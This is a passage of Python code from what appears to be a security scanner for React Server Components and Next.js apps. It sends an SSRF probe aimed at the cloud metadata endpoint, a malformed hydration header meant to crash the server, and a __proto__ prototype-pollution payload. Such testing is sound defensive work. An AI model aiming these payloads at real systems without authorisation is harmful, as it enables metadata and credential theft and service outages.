    # RSC / SSR specific SSRF via dynamic imports or data fetching
    payload = "http://169.254.169.254/latest/meta-data/"
    resp = client.send("GET", scenario.target, headers={"X-Forwarded-Host": payload})
    issues = ["RSC SSR SSRF Potential"] if "ami-id" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_ssr_ssrf", "passed": not issues, "details": issues}

def run_hydration_collapse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # Tampering with hydration data to cause crash
    resp = client.send("GET", scenario.target, headers={"RSC": "1", "X-Nextjs-Data": "invalid"})
    issues = ["Hydration Collapse / Logic Error"] if resp.status_code >= 500 else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_hydration_collapse", "passed": not issues, "details": issues}

def run_flight_trust_boundary_violation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # Injecting non-serializable objects into flight stream
    payload = {"complex": {"__proto__": {"polluted": "true"}}}
    resp = client.send("POST", scenario.target, json_body=payload, headers={"Content-Type": "text/x-component"})
    issues = ["RSC Flight Trust Boundary Violation"] if resp.status_code >= 400 and "Internal" not in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_flight_trust_boundary_violation", "passed": not issues, "details": issues}
